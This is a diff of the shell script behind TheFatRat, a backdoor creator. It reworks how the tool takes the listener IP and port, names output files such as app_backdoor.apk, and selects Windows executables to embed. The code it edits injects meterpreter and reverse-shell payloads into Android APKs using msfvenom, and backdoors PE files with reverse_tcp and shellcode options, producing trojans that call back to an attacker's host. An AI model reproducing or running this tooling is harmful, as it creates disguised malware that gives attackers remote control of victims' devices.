@@ -73,7 +73,7 @@ cat << !
   +------------++-------------------------++-----------------------+
   | LHOST      ||  The Listen Addres      || $yourip
   | LPORT      ||  The Listen Ports       || $yourport
-  | OUTPUTNAME ||  The Filename output    || app_backdoor.apk
+  | OUTPUTNAME ||  The Filename output    || $outf
   +------------++-------------------------++-----------------------+
 
 
@@ -952,28 +952,14 @@ rm -rf output/*
 sleep 2
 echo "Done!"
 echo -e $okegreen""
+echo -e $okegreen""
 sleep 1
-data=$(zenity --forms --title="LHOST & LPORT CONFIG." --text="`printf "Write your LHOST and LPORT \n Ex. LHOST : 192.168.1.60 \n Ex. LPORT : 5678"`" \
---add-entry="LHOST :" \
---add-entry="LPORT :")
-rm -rf host.tmp >/dev/null 2>&1
-touch host.tmp
-echo $data > host.tmp
-tr "|" "\n" <host.tmp >host1.tmp
-yourip=`sed -n 1p host1.tmp`
-yourport=`sed -n 2p host1.tmp`
-rm -rf host.tmp >/dev/null 2>&1
-rm -rf host1.tmp >/dev/null 2>&1
-if [[ -z $yourip ]] 
-then
-zenity --no-wrap --error --text="Your LHOST was empty ."
-menu
-elif [[ -z $yourport ]]
-then
-zenity --no-wrap --error --text="Your LPORT was empty ."
-menu
-fi
-
+echo -ne " SET LHOST : ";tput sgr0
+read yourip
+echo ""
+echo -ne $okegreen "SET LPORT : ";tput sgr0
+read yourport
+echo ""
 copyfile=$(zenity --file-selection --file-filter='APK files (apk) | *.apk' --title="Select your app/game apk file");
 cp $copyfile $path/temp/app.apk >/dev/null 2>&1
 apkt="$path/temp/app.apk"
@@ -988,9 +974,6 @@ echo ""
 payload=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "android/meterpreter/reverse_http" FALSE "android/meterpreter/reverse_https" FALSE "android/meterpreter/reverse_tcp" FALSE "android/shell/reverse_http" FALSE "android/shell/reverse_https" FALSE "android/shell/reverse_tcp" --width 350 --height 300) > /dev/null 2>&1
 echo ""
 echo ""
-echo ""
-spinlong
-gboor2
 spinlong
 echo ""
 sleep 1
@@ -998,6 +981,10 @@ method=$(zenity  --list  --radiolist  --column "Pick" --column "Action" TRUE "Us
 case $method in 
  
 "Use new Backdoor-apk method")
+echo ""
+spinlong
+outf="app_backdoor.apk"
+gboor2
 rm -f $apkconfig >/dev/null 2>&1
 touch $apkconfig 
 echo "app.apk" > $apkconfig
@@ -1014,6 +1001,10 @@ menu
 ;;
 
 "Use old Fatrat method")
+echo ""
+spinlong
+outf="app_backdoored.apk"
+gboor2
 echo "Creating RAT payload with msfvenom"
 echo -e $okegreen ""
 $msfvenom -f raw -p $payload LHOST=$yourip LPORT=$yourport -o $path/temp/payload.apk
@@ -1071,6 +1062,10 @@ rm -rf $path/temp/* >/dev/null 2>&1
 echo -e $okegreen ""
 read -rsp $'Press any key to return to fatrat menu\n' -n 1 key
 echo
+clear
+menu
+;;
+*)
 clear
 menu
 ;;
@@ -1994,7 +1989,7 @@ menu () {
   echo -e $okegreen"    J  \.|'.\/ \                  				"
   echo -e $okegreen"    | |_.|. | | |   $white"[$okegreen--$white] $cyan " $white"Backdoor" Creator for Remote Acces $white[$okegreen--$white] 	"
   echo -e $okegreen"     \__.' .|-' /   $white"[$okegreen--$white] $cyan" Created by: "$red"Edo Maland (Screetsec) $white[$okegreen--$white]	"
-  echo -e $okegreen"     L   /|o'--'\   $white"[$okegreen--$white] $cyan"           Version: $red"$Versi"             $white[$okegreen--$white]	"
+  echo -e $okegreen"     L   /|o'--'\   $white"[$okegreen--$white] $cyan"           Version: $red"$Versi"            $white[$okegreen--$white]	"
   echo -e $okegreen"     |  /\/\/\   \  $white"[$okegreen--$white] $cyan"         Codename: $red"$codename"          $white[$okegreen--$white]    "
   echo -e $okegreen"     J /      \.__\ $white"[$okegreen--$white] $cyan"  Follow me on Github: $red@Screetsec   $white[$okegreen--$white]	"
   echo -e $okegreen"     J /      \.__\ $white"[$okegreen--$white] $cyan"  Dracos Linux : $red@dracos-linux.org  $white[$okegreen--$white]	"
@@ -2042,9 +2037,15 @@ menu () {
   				echo ""
   				spinlong
   				echo ""
-  				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira; read -p '  Located PE file for embed (example:/TheFatRat/PE/putty.exe) : ' embed
+  				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira; 
+                                embed=$(zenity --file-selection --file-filter='EXE files (exe) | *.exe' --title="Select your executable file");
   				payload=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "cave_miner_inline" FALSE "iat_reverse_tcp_inline" FALSE "iat_reverse_tcp_inline_threaded" FALSE "iat_reverse_tcp_stager_threaded" FALSE "iat_user_supplied_shellcode_threaded" FALSE "meterpreter_reverse_https_threaded" FALSE "reverse_shell_tcp_inline" FALSE "reverse_tcp_stager_threaded" FALSE "user_supplied_shellcode_threaded" --width 350 --height 300) > /dev/null 2>&1
   				spinlong
+                                if [ ! -f "$embed" ];then
+                                echo -e $red "You did not setected any executable file"
+                                read -ne "  Press any key to return to menu ."
+                                menu
+                                fi
   				echo ""
   				echo ""
   				gboor
@@ -2052,7 +2053,8 @@ menu () {
   				echo ""
   				echo -e $okegreen""
   				$backdoor -f $embed -s $payload -H $yourip -P $yourport -o output/$fira.exe 
-                                  echo -e "Shell Saved To /backdoored/output/  press any key to continue"
+                                  echo -e "Shell Saved To :
+($path/backdoored/output/$fira.exe)  press any key to continue"
   				read bebeku
   				clear
   				menu
@@ -2240,9 +2242,15 @@ echo
 				echo ""
 				spinlong
 				echo ""
-				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira; read -p '  Located PE file for embed (example:/TheFatRat/PE/putty.exe) : ' embed
-				payload=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "cave_miner_inline" FALSE "iat_reverse_tcp_inline" FALSE "iat_reverse_tcp_inline_threaded" FALSE "iat_reverse_tcp_stager_threaded" FALSE "iat_user_supplied_shellcode_threaded" FALSE "meterpreter_reverse_https_threaded" FALSE "reverse_shell_tcp_inline" FALSE "reverse_tcp_stager_threaded" FALSE "user_supplied_shellcode_threaded" --width 350 --height 300) > /dev/null 2>&1
+				read -p '  Set LHOST IP: ' yourip; read -p '  Set LPORT: ' yourport; read -p '  Please enter the base name for output files : ' fira; 
+				embed=$(zenity --file-selection --file-filter='Exe files (exe) | *.exe' --title="Select your executable file");
+                                payload=$(zenity --list --title "☣ TheFatRat ☣" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "cave_miner_inline" FALSE "iat_reverse_tcp_inline" FALSE "iat_reverse_tcp_inline_threaded" FALSE "iat_reverse_tcp_stager_threaded" FALSE "iat_user_supplied_shellcode_threaded" FALSE "meterpreter_reverse_https_threaded" FALSE "reverse_shell_tcp_inline" FALSE "reverse_tcp_stager_threaded" FALSE "user_supplied_shellcode_threaded" --width 350 --height 300) > /dev/null 2>&1
 				spinlong
+                                if [ ! -f "$embed" ];then
+                                echo -e $red "You did not setected any executable file"
+                                read -ne "  Press any key to return to menu ."
+                                menu
+                                fi
 				echo ""
 				echo ""
 				gboor
@@ -2250,7 +2258,8 @@ echo
 				echo ""
 				echo -e $okegreen""
 				$backdoor -f $embed -s $payload -H $yourip -P $yourport -o output/$fira.exe 
-                                echo -e "Shell Saved To /backdoored/output/  press any key to continue"
+                                echo -e "Shell Saved To 
+($path/backdoored/output/)  press any key to continue"
 				read bebeku
 				clear
 				menu
